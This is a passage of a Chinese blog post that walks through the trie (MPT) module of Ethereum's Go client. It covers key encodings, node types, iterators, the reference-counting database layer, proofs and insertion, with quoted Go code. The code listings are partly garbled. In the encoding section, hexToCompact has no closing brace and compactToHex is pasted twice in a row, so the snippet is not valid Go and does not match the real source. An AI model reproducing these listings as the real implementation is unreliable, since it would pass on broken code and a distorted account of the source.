class="comment">// 返回a和b的公共前缀的长度</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">prefixLen</span><span class="params">(a, b []<span class="type">byte</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> i, length = <span class="number">0</span>, <span class="built_in">len</span>(a)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(b) &lt; length &#123;</span><br><span class="line">        length = <span class="built_in">len</span>(b)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ; i &lt; length; i++ &#123;</span><br><span class="line">        <span class="keyword">if</span> a[i] != b[i] &#123;</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> i</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 十六进制key是否有结束标志符</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hasTerm</span><span class="params">(s []<span class="type">byte</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(s) &gt; <span class="number">0</span> &amp;&amp; s[<span class="built_in">len</span>(s)<span class="number">-1</span>] == <span class="number">16</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上三种编码方式的转换关系为：</p><ul><li>Raw 编码：原生的 key 编码，是 MPT 对外提供接口中使用的编码方式，当数据项被插入到<strong>树</strong>中时，<em><em>Raw 编码被转换成 Hex</em><u>编码</u></em>**；</li><li>Hex 编码：16 进制扩展编码，用于对内存中树节点 key 进行编码，当树节点被持久化到<strong>数据库</strong>时，Hex 编码被转换成 HP 编码；</li><li>HP 编码：16 进制前缀编码，用于对数据库中树节点 key 进行编码，当树节点被加载到<strong>内存</strong>时，HP 编码被转换成 Hex 编码；</li></ul><p>如下图：</p><p><a href="https://tva1.sinaimg.cn/large/0081Kckwgy1gm71rsyyekj319w05ygml.jpg"><img src="https://lky-img.obs.cn-east-2.myhuaweicloud.com/image-20220330161823864.png" alt="image-20220330161823864"></a></p><p>以上介绍的 MPT 树，可以用来存储内容为任何长度的<code>key-value</code>数据项。倘若数据项的<code>key</code>长度没有限制时，当树中维护的数据量较大时，仍然会造成整棵树的深度变得越来越深，会造成以下影响：</p><ul><li>查询一个节点可能会需要许多次 IO 读取，效率低下；</li><li>系统易遭受 Dos 攻击，攻击者可以通过在合约中存储特定的数据，“构造”一棵拥有一条很长路径的树，然后不断地调用<code>SLOAD</code>指令读取该树节点的内容，造成系统执行效率极度下降；</li><li>所有的 key 其实是一种明文的形式进行存储；</li></ul><p>为了解决以上问题，以太坊对<strong>MPT</strong>再进行了一次封装，对数据项的<strong>key</strong>进行了一次哈希计算，因此最终作为参数传入到 MPT 接口的数据项其实是<code>(sha3(key), value)</code></p><p><strong>优势</strong>：</p><ul><li>传入 MPT 接口的 key 是固定长度的（32 字节），可以避免出现树中出现长度很长的路径；</li></ul><p><strong>劣势</strong>：</p><ul><li>每次树操作需要增加一次哈希计算；</li><li>需要在数据库中存储额外的<code>sha3(key)</code>与<code>key</code>之间的对应关系；</li></ul><p>完整的编码流程如图：</p><p><img src="https://lky-img.obs.cn-east-2.myhuaweicloud.com/image-20220330162503765.png" alt="image-20220330162503765"></p><h2 id="MPT-轻节点">MPT 轻节点</h2><p>上面的 MPT 树，有两个问题：</p><ul><li>每个节点都包含有大量信息，并且叶子节点中还包含有完整的数据信息。如果该 MPT 树并没有发生任何变化，并且没有被使用，则会白白占用一大片空间，想象一个以太坊，有多少个 MPT 树，都在内存中，那还了得。</li><li>并不是任何的客户端都对所有的 MPT 树都感兴趣，若每次都把完整的节点信息都下载下，下载时间长不说，并且会占用大量的磁盘空间。</li></ul><h3 id="解决方式">解决方式</h3><p>为了解决上述问题，以太坊使用了一种缓存机制，可以称为是轻节点机制，大体如下：</p><ul><li>若某节点数据一直没有发生变化，则仅仅保留该节点的 32 位 hash 值，剩下的内容全部释放</li><li>若需要插入或者删除某节点，先通过该 hash 值 db 中查找对应的节点，并加载到内存，之后再进行删除插入操作</li></ul><h3 id="轻节点中添加数据">轻节点中添加数据</h3><p>内存中只有这么一个轻节点，但是我要添加一个数据，也就是要给完整的 MPT 树中添加一个叶子节点，怎么添加？大体如下图所示：</p><p><a href="https://tva1.sinaimg.cn/large/0081Kckwgy1gm8hgf9f3ij319a0pcgqh.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1gm8hgf9f3ij319a0pcgqh.jpg" alt="image-20210101204824090" style="zoom:67%;" /></a></p><hr><p>以上主要介绍了以太坊中的 MPT 树的原理，这篇主要会对 MPT 树涉及的源码进行拆解分析。<code>trie</code>模块主要有以下几个文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">|-encoding.go 主要讲编码之间的转换</span><br><span class="line">|-hasher.go 实现了从某个结点开始计算子树的哈希的功能</span><br><span class="line">|-node.go 定义了一个Trie树中所有结点的类型和解析的代码</span><br><span class="line">|-sync.go 实现了SyncTrie对象的定义和所有方法</span><br><span class="line">|-iterator.go 定义了所有枚举相关接口和实现</span><br><span class="line">|-secure_trie.go 实现了SecureTrie对象</span><br><span class="line">|-proof.go 为key构造一个merkle证明</span><br><span class="line">|-trie.go Trie树的增删改查</span><br><span class="line">|-database.go 对内存中的trie树节点进行引用计数</span><br></pre></td></tr></table></figure><h1>实现概览</h1><h2 id="encoding-go">encoding.go</h2><p>这个主要是讲三种编码（<code>KEYBYTES encoding</code>、<code>HEX encoding</code>、<code>COMPACT encoding</code>）的实现与转换，<code>trie</code>中全程都需要用到这些，该文件中主要实现了如下功能：</p><ol><li>hex 编码转换为 Compact 编码：<code>hexToCompact()</code></li><li>Compact 编码转换为 hex 编码：<code>compactToHex()</code></li><li>keybytes 编码转换为 Hex 编码：<code>keybytesToHex()</code></li><li>hex 编码转换为 keybytes 编码：<code>hexToKeybytes()</code></li><li>获取两个字节数组的公共前缀的长度：<code>prefixLen()</code></li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hexToCompact</span><span class="params">(hex []<span class="type">byte</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">    terminator := <span class="type">byte</span>(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> hasTerm(hex) &#123; <span class="comment">//检查是否有结尾为0x10 =&gt; 16</span></span><br><span class="line">        terminator = <span class="number">1</span> <span class="comment">//有结束标记16说明是叶子节点</span></span><br><span class="line">        hex = hex[:<span class="built_in">len</span>(hex)<span class="number">-1</span>] <span class="comment">//去除尾部标记</span></span><br><span class="line">    &#125;</span><br><span class="line">    buf := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="built_in">len</span>(hex)/<span class="number">2</span>+<span class="number">1</span>) <span class="comment">// 字节数组</span></span><br><span class="line"></span><br><span class="line">    buf[<span class="number">0</span>] = terminator &lt;&lt; <span class="number">5</span> <span class="comment">// 标志byte为00000000或者00100000</span></span><br><span class="line">    <span class="comment">//如果长度为奇数，添加奇数位标志1，并把第一个nibble字节放入buf[0]的低四位</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(hex)&amp;<span class="number">1</span> == <span class="number">1</span> &#123;</span><br><span class="line">        buf[<span class="number">0</span>] |= <span class="number">1</span> &lt;&lt; <span class="number">4</span> <span class="comment">// 奇数标志 00110000</span></span><br><span class="line">        buf[<span class="number">0</span>] |= hex[<span class="number">0</span>] <span class="comment">// 第一个nibble包含在第一个字节中 0011xxxx</span></span><br><span class="line">        hex = hex[<span class="number">1</span>:]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//将两个nibble字节合并成一个字节</span></span><br><span class="line">    decodeNibbles(hex, buf[<span class="number">1</span>:])</span><br><span class="line">    <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line"><span class="comment">//compact编码转化为Hex编码</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">compactToHex</span><span class="params">(compact []<span class="type">byte</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">    base := keybytesToHex(compact)</span><br><span class="line">    base = base[:<span class="built_in">len</span>(base)<span class="number">-1</span>]</span><br><span class="line">     <span class="comment">// apply terminator flag</span></span><br><span class="line">    <span class="comment">// base[0]包括四种情况</span></span><br><span class="line">    <span class="comment">// 00000000 扩展节点偶数位</span></span><br><span class="line">    <span class="comment">// 00000001 扩展节点奇数位</span></span><br><span class="line">    <span class="comment">// 00000010 叶子节点偶数位</span></span><br><span class="line">    <span class="comment">// 00000011 叶子节点奇数位</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// apply terminator flag</span></span><br><span class="line">    <span class="keyword">if</span> base[<span class="number">0</span>] &gt;= <span class="number">2</span> &#123;</span><br><span class="line">       <span class="comment">//如果是叶子节点，末尾添加Hex标志位16</span></span><br><span class="line">        base = <span class="built_in">append</span>(base, <span class="number">16</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// apply odd flag</span></span><br><span class="line">    <span class="comment">//如果是偶数位，chop等于2，否则等于1</span></span><br><span class="line">    chop := <span class="number">2</span> - base[<span class="number">0</span>]&amp;<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> base[chop:]</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//compact编码转化为Hex编码</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">compactToHex</span><span class="params">(compact []<span class="type">byte</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">    base := keybytesToHex(compact)</span><br><span class="line">    base = base[:<span class="built_in">len</span>(base)<span class="number">-1</span>]</span><br><span class="line">     <span class="comment">// apply terminator flag</span></span><br><span class="line">    <span class="comment">// base[0]包括四种情况</span></span><br><span class="line">    <span class="comment">// 00000000 扩展节点偶数位</span></span><br><span class="line">    <span class="comment">// 00000001 扩展节点奇数位</span></span><br><span class="line">    <span class="comment">// 00000010 叶子节点偶数位</span></span><br><span class="line">    <span class="comment">// 00000011 叶子节点奇数位</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// apply terminator flag</span></span><br><span class="line">    <span class="keyword">if</span> base[<span class="number">0</span>] &gt;= <span class="number">2</span> &#123;</span><br><span class="line">       <span class="comment">//如果是叶子节点，末尾添加Hex标志位16</span></span><br><span class="line">        base = <span class="built_in">append</span>(base, <span class="number">16</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// apply odd flag</span></span><br><span class="line">    <span class="comment">//如果是偶数位，chop等于2，否则等于1</span></span><br><span class="line">    chop := <span class="number">2</span> - base[<span class="number">0</span>]&amp;<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> base[chop:]</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 将十六进制的bibbles转成key bytes，这只能用于偶数长度的key</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hexToKeybytes</span><span class="params">(hex []<span class="type">byte</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> hasTerm(hex) &#123;</span><br><span class="line">        hex = hex[:<span class="built_in">len</span>(hex)<span class="number">-1</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(hex)&amp;<span class="number">1</span> != <span class="number">0</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(<span class="string">&quot;can&#x27;t convert hex key of odd length&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    key := <span class="built_in">make</span>([]<span class="type">byte</span>, (<span class="built_in">len</span>(hex)+<span class="number">1</span>)/<span class="number">2</span>)</span><br><span class="line">    decodeNibbles(hex, key)</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 返回a和b的公共前缀的长度</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">prefixLen</span><span class="params">(a, b []<span class="type">byte</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> i, length = <span class="number">0</span>, <span class="built_in">len</span>(a)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(b) &lt; length &#123;</span><br><span class="line">        length = <span class="built_in">len</span>(b)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ; i &lt; length; i++ &#123;</span><br><span class="line">        <span class="keyword">if</span> a[i] != b[i] &#123;</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> i</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="node-go">node.go</h2><p>node 接口分四种实现: fullNode，shortNode，valueNode，hashNode，其中只有 fullNode 和 shortNode 可以带有子节点。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> (</span><br><span class="line">fullNode <span class="keyword">struct</span> &#123;</span><br><span class="line">Children [<span class="number">17</span>]node <span class="comment">// 分支节点</span></span><br><span class="line">flags    nodeFlag</span><br><span class="line">&#125;</span><br><span class="line">shortNode <span class="keyword">struct</span> &#123; <span class="comment">//扩展节点</span></span><br><span class="line">Key   []<span class="type">byte</span></span><br><span class="line">Val   node <span class="comment">//可能指向叶子节点，也可能指向分支节点。</span></span><br><span class="line">flags nodeFlag</span><br><span class="line">&#125;</span><br><span class="line">hashNode  []<span class="type">byte</span></span><br><span class="line">valueNode []<span class="type">byte</span> <span class="comment">// 叶子节点值，但是该叶子节点最终还是会包装在shortNode中</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="trie-go">trie.go</h2><p>Trie 对象实现了 MPT 树的所有功能，包括(key, value)对的增删改查、计算默克尔哈希，以及将整个树写入数据库中。</p><h2 id="iterator-go">iterator.go</h2><p><code>nodeIterator</code>提供了遍历树内部所有结点的功能。其结构如下：此结构体是在<code>trie.go</code>定义的</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> nodeIterator <span class="keyword">struct</span> &#123;</span><br><span class="line">trie.NodeIterator</span><br><span class="line">t   *odrTrie</span><br><span class="line">err <span class="type">error</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>里面包含了一个接口<code>NodeIterator</code>，它的实现则是由<code>iterator.go</code>来提供的，其方法如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(it *nodeIterator)</span></span> Next(descend <span class="type">bool</span>) <span class="type">bool</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(it *nodeIterator)</span></span> Hash() common.Hash</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(it *nodeIterator)</span></span> Parent() common.Hash</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(it *nodeIterator)</span></span> Leaf() <span class="type">bool</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(it *nodeIterator)</span></span> LeafKey() []<span class="type">byte</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(it *nodeIterator)</span></span> LeafBlob() []<span class="type">byte</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(it *nodeIterator)</span></span> LeafProof() [][]<span class="type">byte</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(it *nodeIterator)</span></span> Path() []<span class="type">byte</span> &#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(it *nodeIterator)</span></span> seek(prefix []<span class="type">byte</span>) <span class="type">error</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(it *nodeIterator)</span></span> peek(descend <span class="type">bool</span>) (*nodeIteratorState, *<span class="type">int</span>, []<span class="type">byte</span>, <span class="type">error</span>)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(it *nodeIterator)</span></span> nextChild(parent *nodeIteratorState, ancestor common.Hash) (*nodeIteratorState, []<span class="type">byte</span>, <span class="type">bool</span>)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(it *nodeIterator)</span></span> push(state *nodeIteratorState, parentIndex *<span class="type">int</span>, path []<span class="type">byte</span>)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(it *nodeIterator)</span></span> pop()</span><br></pre></td></tr></table></figure><p><code>NodeIterator</code>的核心是<code>Next</code>方法，每调用一次这个方法，NodeIterator 对象代表的当前节点就会更新至下一个节点，当所有结点遍历结束，<code>Next</code>方法返回<code>false</code>。</p><p>生成 NodeIterator 接口的方法有以下 3 种：</p><p><strong>①：Trie.NodeIterator(start []byte)</strong></p><p>通过<code>start</code>参数指定从哪个路径开始遍历，如果为<code>nil</code>则从头到尾按顺序遍历。</p><p><strong>②：NewDifferenceIterator(a, b NodeIterator)</strong></p><p>当调用<code>NewDifferenceIterator(a, b NodeIterator)</code>后，生成的<code>NodeIterator</code>只遍历存在于 b 但不存在于 a 中的结点。</p><p><strong>③：NewUnionIterator(iters []NodeIterator)</strong></p><p>当调用<code>NewUnionIterator(its []NodeIterator)</code>后，生成的<code>NodeIterator</code>遍历的结点是所有传入的结点的合集。</p><h2 id="database-go">database.go</h2><p><code>Database</code>是<code>trie</code>模块对真正数据库的缓存层，其目的是对缓存的节点进行引用计数，从而实现区块的修剪功能。主要方法如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewDatabase</span><span class="params">(diskdb ethdb.KeyValueStore)</span></span> *Database</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewDatabaseWithCache</span><span class="params">(diskdb ethdb.KeyValueStore, cache <span class="type">int</span>)</span></span> *Database</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(db *Database)</span></span> DiskDB() ethdb.KeyValueReader</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(db *Database)</span></span> InsertBlob(hash common.Hash, blob []<span class="type">byte</span>)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(db *Database)</span></span> insert(hash common.Hash, blob []<span class="type">byte</span>, node node)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(db *Database)</span></span> insertPreimage(hash common.Hash, preimage []<span class="type">byte</span>)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(db *Database)</span></span> node(hash common.Hash) node</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(db *Database)</span></span> Node(hash common.Hash) ([]<span class="type">byte</span>, <span class="type">error</span>)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(db *Database)</span></span> preimage(hash common.Hash) ([]<span class="type">byte</span>, <span class="type">error</span>)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(db *Database)</span></span> secureKey(key []<span class="type">byte</span>) []<span class="type">byte</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(db *Database)</span></span> Nodes() []common.Hash</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(db *Database)</span></span> Reference(child common.Hash, parent common.Hash)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(db *Database)</span></span> Dereference(root common.Hash)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(db *Database)</span></span> dereference(child common.Hash, parent common.Hash)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(db *Database)</span></span> Cap(limit common.StorageSize) <span class="type">error</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(db *Database)</span></span> Commit(node common.Hash, report <span class="type">bool</span>) <span class="type">error</span></span><br></pre></td></tr></table></figure><h2 id="security-trie-go">security_trie.go</h2><p>可以理解为加密了的<code>trie</code>的实现，<code>ecurity_trie</code>包装了一下<code>trie</code>树， 所有的<code>key</code>都转换成<code>keccak256</code>算法计算的<code>hash</code>值。同时在数据库里面存储<code>hash</code>值对应的原始的<code>key</code>。<br>但是官方在代码里也注释了，这个代码不稳定，除了测试用例，别的地方并没有使用该代码。</p><h2 id="proof-go">proof.go</h2><ul><li>Prove()：根据给定的<code>key</code>，在<code>trie</code>中，将满足<code>key</code>中最大长度前缀的路径上的节点都加入到<code>proofDb</code>（队列中每个元素满足：未编码的 hash 以及对应<code>rlp</code>编码后的节点）</li><li>VerifyProof()：验证<code>proffDb</code>中是否存在满足输入的<code>hash</code>，和对应 key 的节点，如果满足，则返回<code>rlp</code>解码后的该节点。</li></ul><h1>实现细节</h1><p>①：<strong>Trie 树的初始化</strong></p><p>如果<code>root</code>不为空，就通过<code>resolveHash</code>来加载整个<code>Trie</code>树，如果为空，就新建一个<code>Trie</code>树。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">New</span><span class="params">(root common.Hash, db *Database)</span></span> (*Trie, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> db == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">&quot;trie.New called without a database&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">trie := &amp;Trie&#123;</span><br><span class="line">db: db,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> root != (common.Hash&#123;&#125;) &amp;&amp; root != emptyRoot &#123;</span><br><span class="line">rootnode, err := trie.resolveHash(root[:], <span class="literal">nil</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">trie.root = rootnode</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> trie, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>②：<strong>Trie 树的插入</strong></p><p>首先 Trie 树的插入是个递归调用的过程，它会从根开始找，一直找到合适的位置插入。</p><img src="https://lky-img.obs.cn-east-2.myhuaweicloud.com/image-20220330162606450.png" alt="image-20220330162606450" style="zoom:50%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func (t *Trie) insert(n node, prefix, key []byte, value node) (bool, node, error)</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li>n: 当前要插入的节点</li><li>prefix: 当前已经处理完的<strong>key</strong>(节点共有的前缀)</li><li>key: 未处理完的部分<strong>key</strong>，完整的<code>key = prefix + key</code></li><li>value：需要插入的值</li></ul><p>返回值说明：</p><ul><li>bool : 操作是否改变了<strong>Trie</strong>树(<strong>dirty</strong>)</li><li>Node :插入完成后的子树的根节点</li></ul><p>接下来就是分别对<code>shortNode</code>、<code>fullNode</code>、<code>hashNode</code>、<code>nil</code> 几种情况进行说明。</p><p><strong>2.1：节点为 nil</strong></p><p>空树直接返回<code>shortNode</code>， 此时整颗树的根就含有了一个<code>shortNode</code>节点。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="literal">nil</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>, &amp;shortNode&#123;key, value, t.newFlag()&#125;, <span class="literal">nil</span></span><br></pre></td></tr></table></figure><p><strong>2.2 ：节点为 shortNode</strong></p><ul><li>首先计算公共前缀，如果公共前缀就等于<code>key</code>，那么说明这两个<code>key</code>是一样的，如果<code>value</code>也一样的(<code>dirty == false</code>)，那么返回错误。</li><li>如果没有错误就更新<code>shortNode</code>的值然后返回</li><li>如果公共前缀不完全匹配，那么就需要把公共前缀提取出来形成一个独立的节点(扩展节点),扩展节点后面连接一个<code>branch</code>节点，<code>branch</code>节点后面看情况连接两个<code>short</code>节点。</li><li>首先构建一个 branch 节点(branch := &amp;fullNode{flags: t.newFlag()}),然后再 branch 节点的 Children 位置调用 t.insert 插入剩下的两个 short 节点</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">matchlen := prefixLen(key, n.Key)</span><br><span class="line"><span class="keyword">if</span> matchlen == <span class="built_in">len</span>(n.Key) &#123;</span><br><span class="line">dirty, nn, err := t.insert(n.Val, <span class="built_in">append</span>(prefix, key[:matchlen]...), key[matchlen:], value)</span><br><span class="line"><span class="keyword">if</span> !dirty || err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, n, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>, &amp;shortNode&#123;n.Key, nn, t.newFlag()&#125;, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">branch := &amp;fullNode&#123;flags: t.newFlag()&#125;</span><br><span class="line"><span class="keyword">var</span> err <span class="type">error</span></span><br><span class="line">_, branch.Children[n.Key[matchlen]], err = t.insert(<span class="literal">nil</span>, <span class="built_in">append</span>(prefix, n.Key[:matchlen+<span class="number">1</span>]...), n.Key[matchlen+<span class="number">1</span>:], n.Val)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">_, branch.Children[key[matchlen]], err = t.insert(<span class="literal">nil</span>, <span class="built_in">append</span>(prefix, key[:matchlen+<span class="number">1</span>]...), key[matchlen+<span class="number">1</span>:], value)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> 